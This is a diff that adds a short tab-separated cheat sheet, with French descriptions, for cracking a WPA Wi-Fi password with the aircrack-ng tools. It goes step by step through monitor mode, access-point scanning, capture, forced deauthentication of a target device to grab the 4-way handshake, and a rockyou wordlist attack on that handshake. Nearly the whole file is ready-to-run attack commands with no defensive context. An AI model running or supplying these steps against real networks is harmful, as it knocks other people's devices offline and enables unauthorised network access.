@@ -1,0 +1,13 @@
+check conflicting ps and kill it	sudo airmon-ng check kill
+se mettre en mode monitor	sudo airmon-ng start interface
+arrêter le mode monitor (nécessaire pour utiliser internet, afficher table arp, etc)	sudo airmon-ng stop interface
+se mettre en mode managed après avoir arrêté le mode monitor	ifconfig wlan0 down && iwconf ig wlan0 mode managed && ifconfig wlan0 up
+vérifier le mode monitor	sudo airmon-ng
+lister les différentes passerelles	sudo airodump-ng interface
+lister sur une chaine en particulier et sur un point d’accès en particulier	sudo airodump-ng interface –c channel -d macESSID
+pareil, en enregistrant dans un fichier	sudo airodump-ng -w hack1 -c channel –-bssid macPointAcces interface
+déconnecter un appareil du réseau	sudo aireplay-ng interface -0 1 -a macAccess -c macCible
+vérifier que le 4 handshake a été capturé	wireshark file.cap (puis chercher « EAPOL » (4 msg))
+aller à la rockyou liste	cd /usr/share/wordlists
+dézipper la rockyou liste	sudo gzip -d rockyou.txt.gz
+trouver le mdp à partir du 4-handshake et de la liste de mots	aircrack-ng file.cap -w /usr/share/wordlists/rockyou.txt
